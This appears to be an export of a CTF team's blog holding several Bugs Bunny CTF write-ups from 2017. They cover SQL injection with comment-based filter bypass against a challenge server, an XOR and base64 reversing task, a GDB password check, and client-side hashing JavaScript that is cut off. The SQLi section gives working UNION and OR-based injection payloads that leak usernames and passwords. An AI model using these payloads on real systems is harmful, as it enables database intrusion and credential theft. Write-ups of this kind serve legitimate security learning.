&lt;p&gt; _Easy_I_Dont_Think&lt;/p&gt; &lt;/div&gt;....(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/1,1--\".... &lt;div class=\"login-help\"&gt; &lt;p&gt; hello&lt;/p&gt; &lt;/div&gt;....(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/2,1--\".... &lt;div class=\"login-help\"&gt; &lt;p&gt; here&lt;/p&gt; &lt;/div&gt;....(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/3,1--\".... &lt;div class=\"login-help\"&gt; &lt;p&gt; test&lt;/p&gt; &lt;/div&gt;....(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/4,1--\".... &lt;div class=\"login-help\"&gt; &lt;p&gt; &#125;&lt;/p&gt; &lt;/div&gt;.... With changing the limit we leaked all the passwords from the users as we can see the first user gave us an incomplete flag the others don’t seem to be part of the flag since there isn’t any “_” separating the words so lets assume our flag ends like “_Easy_I_Dont_Think}”.The rest of the flag must be in the username column! 123kinyabitch@Debian ~/D/H/ctf&gt; curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/username/**/from/**/users/**/limit/**/0,1--\"No way SOrry Fuck they are filtering the username too? wee need another technique to get the username field! Lets try to make the query always true! and then inject an union query: 1234567891011121314151617181920212223242526272829303132curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\\\"a\\\"/**/limit/**/0,1/**/--\"...&lt;div class=\"login-help\"&gt; &lt;p&gt; Bugs_Bunny&#123;SQLi_Easy_!!&lt;/p&gt;&lt;/div&gt;...curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\\\"a\\\"/**/limit/**/1,1/**/--\"...&lt;div class=\"login-help\"&gt; &lt;p&gt; a&lt;/p&gt; &lt;/div&gt;...curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\\\"a\\\"/**/limit/**/2,1/**/--\"... &lt;div class=\"login-help\"&gt; &lt;p&gt; flag_is&lt;/p&gt; &lt;/div&gt;...curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\\\"a\\\"/**/limit/**/3,1/**/--\"... &lt;div class=\"login-help\"&gt; &lt;p&gt; hello&lt;/p&gt; &lt;/div&gt;...curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\\\"a\\\"/**/limit/**/4,1/**/--\"...&lt;div class=\"login-help\"&gt; &lt;p&gt; so_2017!&lt;/p&gt;&lt;/div&gt;... The flag is the combination of the some of this strings after some trial and error trying to login I could see that the login table is: 12345678Usersid username password1 hello hello2 flag_is here 3 Bugs_Bunny&#123;SQLi_Easy_!! _Easy_I_Dont_Think4 so_2017! &#125; 5 test test So the flag is Bugs_Bunny{SQLiEasy!!_Easy_I_Dont_Thinkso_2017!}","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"sqli","slug":"sqli","permalink":"https://teamrocketist.github.io/tags/sqli/"},{"name":"filterbypass","slug":"filterbypass","permalink":"https://teamrocketist.github.io/tags/filterbypass/"}]},{"title":"[Reverse] BugsBunny CTF - Rev75","slug":"Reverse-BugsBunny-CTF-Rev75","date":"2017-08-01T08:03:50.000Z","updated":"2017-08-10T02:53:58.861Z","comments":true,"path":"2017/08/01/Reverse-BugsBunny-CTF-Rev75/","link":"","permalink":"https://teamrocketist.github.io/2017/08/01/Reverse-BugsBunny-CTF-Rev75/","excerpt":"","text":"rev100100Find me faster !Author: Aymen Borgi At first by checking the main function we can observe that it leads us to nowhere either gives us the strings “bad password” or “good but no flag for you hihihi xD” if we gave the right password which could be found simply by debugging and break points. Now the flag must be in another functions there is alot starting from a0 to a814 By checking one of them we can see it contains a string that looks like they are encoded by base64 My plan was to copy all disassembled code from this functions and then use regex to get all the strings between quotes and concatenate them. After that I decoded the string and got a png image with the flag! here is the script: 12345strings = \"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Y2jUqFHh97//fUZvq7q6OkyfPj389a9/DXPmzAnLli0LGzduDJWVlR4BhCYal9AUnVFUVBRKSkpCq1atQseOHUOfPn3CueeeGy688MJQXJyZV+8JwP9Od9FFF4Xx48eHfffdN28OlPr+6qVpj6EePXqEf/7zn8lHd7H33Ykbm4U/Lu1zY2dP7IzG2KOfAp4/f36YMWNGePXVV8PixYvD6tWrw6pVq0JVVVUoKysLXbt2DSeddFL4zne+E3r37u1elXo1a9YsdOzYMQwdOjTceuut4g+MSyjoznAZGH8pgbFpbNrn9rntuLftOwEIALB3cR1AAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEABAANoEAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAACy5v8BjDWwa4oYZqgAAAAASUVORK5CYII=\"fh = open(\"flag.png\", \"wb\")fh.write(base64.b64decode(strings))fh.close() And now the flag","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"base64","slug":"base64","permalink":"https://teamrocketist.github.io/tags/base64/"}]},{"title":"[Reverse] Bugs Bunny CTF - Rev100","slug":"Reverse-Bugs-Bunny-CTF-Rev100","date":"2017-07-31T15:14:17.000Z","updated":"2017-08-10T03:13:15.198Z","comments":true,"path":"2017/07/31/Reverse-Bugs-Bunny-CTF-Rev100/","link":"","permalink":"https://teamrocketist.github.io/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev100/","excerpt":"","text":"Find me faster !Author: Aymen Borgirev100.zipStarting to open our executable file on IDA:There is some weird shit going around but we can see a function i_am_debugged() which leads you to exit the program if you running the program on a debugger like gdb or even IDA, there is alot of calls as you can see in the assembly code I could run the debugger and change those registers to not jump out of the program but since there was alot of calls I chose to do it in another way.After a while I found this “loop” in the assembly code we can see they are just xoring two strange strings, variable “a” and variable “b” and then saving it on variable “c”.Now we just need to find those “a” and “b” initial values and convert this assembly into python.Finding “a” and “b” values is easy we can use IDA to do that:Now we just write a python script equivalent to this assembly (Notice that wrote the strings in python as hex bytes because some characters weren’t pritable): 12345678910a = '\\x61\\x41\\x40\\x37\\x6d\\x77\\x34\\x2c\\x5f\\x41\\x42\\x60\\x07\\x34\\x7d\\x12\\x57\\x7a\\x22\\x25\\x4f\\x28'b = '\\x23\\x34\\x27\\x44\\x32\\x35\\x41\\x42\\x31\\x38\\x39\\x38\\x37\\x46\\x22\\x23\\x24\\x25\\x44\\x50\\x21\\x55' c = ''v4 = len(a) + 1v5 = len(b) + 1for i in range(0, v4-1): c += chr(ord(a[i])^ord(b[i])) print cprint c Running the script: 123kinyabitch@Debian ~/D/H/ctf&gt; python rev100.py Bugs_Bunny&#123;X0r_1s_fun&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"}]},{"title":"[Reverse] - Bugs Bunny CTF - Rev 50","slug":"Reverse-Bugs-Bunny-CTF-Rev-50","date":"2017-07-31T14:16:03.000Z","updated":"2017-08-10T02:54:39.509Z","comments":true,"path":"2017/07/31/Reverse-Bugs-Bunny-CTF-Rev-50/","link":"","permalink":"https://teamrocketist.github.io/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev-50/","excerpt":"","text":"only guess50Reverse Engineering … ooh no need !put the right password between Bugs_Bunny{…}Author: Aymen Borgi Starting by Executing the file: 123kinyabitch@Debian ~/D/H/ctf&gt; rev50/rev50usage ./rev50 password Using the ida pro to check all the strings in the program we can see there were alot of them so we can’t really guess which one is it without analysing the program itself Checking out the main function with ida pro we can see: We now can see where our program is checking if the flag is correct if we manage to check value of the register RAX register before that strcmp ocurrs. I could use IDA to check those values but since is alot of trouble to do remote execute the file in a linux machine (I was executing ida in a windows VM machine) to not loose time I rather preferred to check the value on GDB: Disassembling the main functionIdentify the address and do a break point and checking the value on the register RAXRerunning the program with the password “mercedes”Finally our flag is BugsBunny{mercedes}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"gdb","slug":"gdb","permalink":"https://teamrocketist.github.io/tags/gdb/"}]},{"title":"[Web] Bugs Bunny Ctf - Web 100","slug":"Web-Bugs-Bunny-Ctf-Web-100","date":"2017-07-31T10:50:11.000Z","updated":"2017-08-10T02:58:59.505Z","comments":true,"path":"2017/07/31/Web-Bugs-Bunny-Ctf-Web-100/","link":"","permalink":"https://teamrocketist.github.io/2017/07/31/Web-Bugs-Bunny-Ctf-Web-100/","excerpt":"","text":"Web100100My secure system is secure even you have my codehttp://52.53.151.123/web/web100.html This one was fairly easy the first thing that showed up on the web page was a http auth which was asking for a password my first thought was to bruteforce the password but first I checked up the website executing the command curl with bash: 12curl 'http://52.53.151.123/web/web100.html' And then showed up some javascript code: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210var generate = function(string) &#123; function RT(lValue, iShiftBits) &#123; return (lValue &lt;&lt; iShiftBits) | (lValue &gt;&gt;&gt; (32 - iShiftBits)); &#125; function AU(lX, lY) &#123; var lX4, lY4, lX8, lY8, lResult; lX8 = (lX &amp; 0x80000000); lY8 = (lY &amp; 0x80000000); lX4 = (lX &amp; 0x40000000); lY4 = (lY &amp; 0x40000000); lResult = (lX &amp; 0x3FFFFFFF) + (lY &amp; 0x3FFFFFFF); if (lX4 &amp; lY4) &#123; return (lResult ^ 0x80000000 ^ lX8 ^ lY8); &#125; if (lX4 | lY4) &#123; if (lResult &amp; 0x40000000) &#123; return (lResult ^ 0xC0000000 ^ lX8 ^ lY8); &#125; else &#123; return (lResult ^ 0x40000000 ^ lX8 ^ lY8); &#125; &#125; else &#123; return (lResult ^ lX8 ^ lY8); &#125; &#125; function F(x, y, z) &#123; return (x &amp; y) | ((~x) &amp; z); &#125; function G(x, y, z) &#123; return (x &amp; z) | (y &amp; (~z)); &#125; function H(x, y, z) &#123; return (x ^ y ^ z); &#125; function I(x, y, z) &#123; return (y ^ (x | (~z))); &#125; function FF(a, b, c, d, x, s, ac) &#123; a = AU(a, AU(AU(F(b, c, d), x), ac)); return AU(RT(a, s), b); &#125;; function GG(a, b, c, d, x, s, ac) &#123; a = AU(a, AU(AU(G(b, c, d), x), ac)); return AU(RT(a, s), b); &#125;; function HH(a, b, c, d, x, s, ac) &#123; a = AU(a, AU(AU(H(b, c, d), x), ac)); return AU(RT(a, s), b); &#125;; function II(a, b, c, d, x, s, ac) &#123; a = AU(a, AU(AU(I(b, c, d), x), ac)); return AU(RT(a, s), b); &#125;; function CTWA(bytes) &#123; var lWordCount; var lMessageLength = bytes.length; var lNumberOfWords_temp1 = lMessageLength + 8; var lNumberOfWords_temp2 = (lNumberOfWords_temp1 - (lNumberOfWords_temp1 % 64)) / 64; var lNumberOfWords = (lNumberOfWords_temp2 + 1) * 16; var lWordArray = Array(lNumberOfWords - 1); var lBytePosition = 0; var lByteCount = 0; while (lByteCount &lt; lMessageLength) &#123; lWordCount = (lByteCount - (lByteCount % 4)) / 4; lBytePosition = (lByteCount % 4) * 8; lWordArray[lWordCount] = (lWordArray[lWordCount] | (bytes[lByteCount] &lt;&lt; lBytePosition)); lByteCount++; &#125; lWordCount = (lByteCount - (lByteCount % 4)) / 4; lBytePosition = (lByteCount % 4) * 8; lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80 &lt;&lt; lBytePosition); lWordArray[lNumberOfWords - 2] = lMessageLength &lt;&lt; 3; lWordArray[lNumberOfWords - 1] = lMessageLength &gt;&gt;&gt; 29; return lWordArray; &#125;; function 